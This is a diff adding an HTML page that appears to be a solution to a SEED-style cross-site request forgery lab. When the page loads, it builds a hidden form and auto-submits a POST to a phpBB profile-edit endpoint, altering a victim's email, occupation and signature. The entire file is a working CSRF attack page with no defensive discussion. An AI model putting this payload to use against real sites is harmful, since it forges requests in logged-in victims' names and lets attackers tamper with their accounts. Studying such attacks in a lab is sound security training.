@@ -1,0 +1,37 @@
+<html><body><h1>
+This page sends a HTTP POST request onload.
+</h1>
+<script>
+function post(url,fields)
+{
+   //create a <form> element.
+   var p = document.createElement('form');
+   //construct the form
+   p.action = url;
+   p.innerHTML = fields;
+   p.target = '_self';
+   p.method = 'post';
+   //append the form to this web.
+   document.body.appendChild(p);
+   //submit the form
+   p.submit();
+}
+function csrf_hack()
+{
+   var fields;
+
+   // You should replace the following 3 lines with your form parameters
+   fields += "<input type='hidden' name='email' value='bob@seed.com'>";
+   fields += "<input type='hidden' name='user_id' value='4'>";
+   fields += "<input type='hidden' name='occupation' value='bad occupation'>";
+   fields += "<input type='hidden' name='signature' value='signature changed'>";
+   fields += "<input type='hidden' name='Submit' value='Submit'>";
+
+   post('http://www.csrflabphpbb.com/profile.php?mode=editprofile',fields);
+}
+
+window.onload = function(){csrf_hack();}
+
+</script>
+
+</body></html>
